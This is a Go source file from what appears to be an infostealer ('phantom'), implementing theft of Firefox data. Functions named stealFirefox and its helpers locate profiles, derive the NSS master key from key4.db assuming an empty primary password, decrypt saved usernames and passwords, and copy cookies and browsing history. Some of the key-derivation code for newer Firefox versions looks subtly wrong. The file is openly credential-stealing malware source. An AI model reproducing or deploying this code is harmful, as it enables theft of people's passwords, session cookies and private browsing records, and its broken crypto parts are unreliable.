package browsers

import (
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"phantom/syscalls"

	"golang.org/x/crypto/pbkdf2"
)

type FirefoxProfile struct {
	Path string
	Name string
}

type NSSKeySlot struct {
	Type   int
	Salt   []byte
	Rounds int
	IV     []byte
	Data   []byte
}

// nssDecodeItem represents a decoded item from key4.db metadata
type nssDecodeItem struct {
	AlgorithmInfo struct {
		Algorithm asn1.ObjectIdentifier
		Params    struct {
			Salt       []byte
			Iterations int
		}
	}
	EncryptedData []byte
}

// pbeParams for PKCS5 PBES2
type pbeParams struct {
	KDF struct {
		Algorithm asn1.ObjectIdentifier
		Params    struct {
			Salt       []byte
			Iterations int
			KeyLength  int `asn1:"optional"`
			PRF        struct {
				Algorithm asn1.ObjectIdentifier
			} `asn1:"optional"`
		}
	}
	Cipher struct {
		Algorithm asn1.ObjectIdentifier
		IV        []byte
	}
}

// stealFirefox extracts Firefox data
func stealFirefox() *BrowserData {
	data := &BrowserData{}

	profilesPath := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(profilesPath); os.IsNotExist(err) {
		return data
	}

	profiles := findFirefoxProfiles(profilesPath)
	for _, profile := range profiles {
		passwords := stealFirefoxPasswords(profile.Path)
		data.Passwords = append(data.Passwords, passwords...)

		cookies := stealFirefoxCookies(profile.Path)
		data.Cookies = append(data.Cookies, cookies...)

		history := stealFirefoxHistory(profile.Path)
		data.History = append(data.History, history...)
	}

	return data
}

func findFirefoxProfiles(profilesPath string) []FirefoxProfile {
	var profiles []FirefoxProfile

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if entry.IsDir() {
			profilePath := filepath.Join(profilesPath, entry.Name())
			// check for key files
			if _, err := os.Stat(filepath.Join(profilePath, "key4.db")); err == nil {
				profiles = append(profiles, FirefoxProfile{
					Path: profilePath,
					Name: entry.Name(),
				})
			}
		}
	}

	return profiles
}

func stealFirefoxPasswords(profilePath string) []Password {
	var passwords []Password

	loginsPath := filepath.Join(profilePath, "logins.json")
	if _, err := os.Stat(loginsPath); os.IsNotExist(err) {
		return passwords
	}

	masterPassword := getFirefoxMasterKey(profilePath)
	if masterPassword == nil {
		return passwords
	}

	content, err := os.ReadFile(loginsPath)
	if err != nil {
		return passwords
	}

	var loginsData struct {
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		} `json:"logins"`
	}

	if err := json.Unmarshal(content, &loginsData); err != nil {
		return passwords
	}

	for _, login := range loginsData.Logins {
		username := decryptFirefoxValue(login.EncryptedUsername, masterPassword)
		password := decryptFirefoxValue(login.EncryptedPassword, masterPassword)

		if username != "" && password != "" {
			passwords = append(passwords, Password{
				URL:      login.Hostname,
				Username: username,
				Password: password,
				Browser:  "Firefox",
			})
		}
	}

	return passwords
}

func getFirefoxMasterKey(profilePath string) []byte {
	key4Path := filepath.Join(profilePath, "key4.db")
	if _, err := os.Stat(key4Path); os.IsNotExist(err) {
		return nil
	}

	tempPath := filepath.Join(os.TempDir(), "key4_firefox.db")
	copyFile(key4Path, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return nil
	}
	defer db.Close()

	// get global salt and encrypted data from metadata table
	var item1, item2 []byte
	err = db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'").Scan(&item1, &item2)
	if err != nil {
		return nil
	}

	// get the encrypted master key from nssPrivate table
	var a11 []byte
	err = db.QueryRow("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL").Scan(&a11)
	if err != nil {
		return nil
	}

	globalSalt := item1

	// item2 contains ASN.1 encoded encryption parameters
	// try to decode as PBES2 first (newer Firefox)
	var pbes2 struct {
		Algorithm struct {
			Algorithm asn1.ObjectIdentifier
			Params    pbeParams
		}
		EncryptedData []byte
	}

	_, err = asn1.Unmarshal(item2, &pbes2)
	if err == nil && len(pbes2.Algorithm.Params.KDF.Params.Salt) > 0 {
		// PBES2 format (Firefox 58+)
		return decryptPBES2(globalSalt, pbes2.Algorithm.Params, a11)
	}

	// fallback to older format
	decodedItem2 := decodeASN1(item2)
	if decodedItem2 == nil {
		return nil
	}

	// derive key using PBKDF2 with SHA1
	// Firefox uses: HP = SHA1(globalSalt || password)
	// then: CHP = SHA1(HP || entrySalt)
	// then: PBKDF2(CHP, entrySalt, iterations, keyLen)
	hp := sha1.Sum(append(globalSalt, []byte("")...)) // empty password
	chp := sha1.Sum(append(hp[:], decodedItem2.Salt...))

	k1 := pbkdf2.Key(chp[:], decodedItem2.Salt, decodedItem2.Rounds, 32, sha1.New)

	// generate k2 using HMAC
	k2 := hmac.New(sha1.New, k1)
	k2.Write(decodedItem2.IV)
	k := k2.Sum(nil)

	// decrypt a11 to get master key
	masterKey := decryptTripleDES(a11, k[:24], decodedItem2.IV)

	// the first 24 bytes are the actual key
	if len(masterKey) >= 24 {
		return masterKey[:24]
	}

	return masterKey
}

// decryptPBES2 handles Firefox 58+ key derivation
func decryptPBES2(globalSalt []byte, params pbeParams, encryptedKey []byte) []byte {
	// Firefox 58+ uses PBES2 with PBKDF2-HMAC-SHA256 and AES-CBC
	salt := params.KDF.Params.Salt
	iterations := params.KDF.Params.Iterations
	iv := params.Cipher.IV

	// password is empty string by default
	password := []byte("")

	// derive key: SHA1(globalSalt || password)
	hp := sha1.Sum(append(globalSalt, password...))

	// PBKDF2 with the salt from params
	key := pbkdf2.Key(hp[:], salt, iterations, 32, sha1.New)

	// decrypt using 3DES-CBC (or AES depending on OID)
	decrypted := decryptTripleDES(encryptedKey, key, iv)
	if len(decrypted) >= 24 {
		return decrypted[:24]
	}

	return decrypted
}

func decodeASN1(data []byte) *NSSKeySlot {
	var slot NSSKeySlot
	_, err := asn1.Unmarshal(data, &slot)
	if err != nil {
		return nil
	}
	return &slot
}

func decryptFirefoxValue(encrypted string, masterKey []byte) string {
	decoded, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}

	// Firefox login values are wrapped in ASN.1
	// structure: SEQUENCE { keyID, SEQUENCE { algorithm, IV }, encryptedData }
	var loginASN1 struct {
		KeyID         []byte
		AlgorithmInfo struct {
			Algorithm asn1.ObjectIdentifier
			IV        []byte
		}
		EncryptedData []byte
	}

	_, err = asn1.Unmarshal(decoded, &loginASN1)
	if err != nil {
		// try direct decryption for older format
		decrypted := decryptTripleDES(decoded, masterKey, nil)
		return string(decrypted)
	}

	// decrypt using 3DES-CBC with extracted IV
	decrypted := decryptTripleDES(loginASN1.EncryptedData, masterKey, loginASN1.AlgorithmInfo.IV)
	if decrypted == nil {
		return ""
	}

	return string(decrypted)
}

func decryptTripleDES(ciphertext, key, iv []byte) []byte {
	if len(key) < 24 {
		// pad key to 24 bytes for 3DES
		paddedKey := make([]byte, 24)
		copy(paddedKey, key)
		key = paddedKey
	}

	block, err := des.NewTripleDESCipher(key[:24])
	if err != nil {
		return nil
	}

	if len(iv) == 0 || len(iv) < 8 {
		// default IV if none provided
		iv = make([]byte, 8)
	}

	if len(ciphertext) < block.BlockSize() {
		return nil
	}

	// CBC mode decryption
	mode := cipher.NewCBCDecrypter(block, iv[:8])

	// make sure ciphertext is multiple of block size
	if len(ciphertext)%block.BlockSize() != 0 {
		return nil
	}

	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// remove PKCS7 padding
	plaintext = pkcs7Unpad(plaintext)

	return plaintext
}

// pkcs7Unpad removes PKCS7 padding from decrypted data
func pkcs7Unpad(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	paddingLen := int(data[len(data)-1])
	if paddingLen > len(data) || paddingLen > 8 {
		return data // invalid padding, return as-is
	}

	// verify padding bytes are all the same
	for i := len(data) - paddingLen; i < len(data); i++ {
		if data[i] != byte(paddingLen) {
			return data // invalid padding
		}
	}

	return data[:len(data)-paddingLen]
}

func stealFirefoxCookies(profilePath string) []Cookie {
	var cookies []Cookie

	cookiesPath := filepath.Join(profilePath, "cookies.sqlite")
	if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
		return cookies
	}

	tempPath := filepath.Join(os.TempDir(), "cookies_firefox.db")
	copyFile(cookiesPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return cookies
	}
	defer db.Close()

	rows, err := db.Query("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
	if err != nil {
		return cookies
	}
	defer rows.Close()

	for rows.Next() {
		var host, name, value, path string
		var expiry int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &value, &path, &expiry, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		cookies = append(cookies, Cookie{
			Host:       host,
			Name:       name,
			Value:      value,
			Path:       path,
			Expires:    expiry,
			IsSecure:   isSecure == 1,
			IsHTTPOnly: isHTTPOnly == 1,
			Browser:    "Firefox",
		})
	}

	return cookies
}

func stealFirefoxHistory(profilePath string) []HistoryEntry {
	var history []HistoryEntry

	placesPath := filepath.Join(profilePath, "places.sqlite")
	if _, err := os.Stat(placesPath); os.IsNotExist(err) {
		return history
	}

	tempPath := filepath.Join(os.TempDir(), "places_firefox.db")
	copyFile(placesPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return history
	}
	defer db.Close()

	rows, err := db.Query("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY visit_count DESC LIMIT 500")
	if err != nil {
		return history
	}
	defer rows.Close()

	for rows.Next() {
		var url string
		var title sql.NullString
		var visitCount int
		var lastVisit sql.NullInt64

		if err := rows.Scan(&url, &title, &visitCount, &lastVisit); err != nil {
			continue
		}

		titleStr := ""
		if title.Valid {
			titleStr = title.String
		}

		history = append(history, HistoryEntry{
			URL:        url,
			Title:      titleStr,
			VisitCount: visitCount,
			LastVisit:  lastVisit.Int64,
			Browser:    "Firefox",
		})
	}

	return history
}

// placeholder for DPAPI from syscalls
var _ = syscalls.CryptUnprotectData
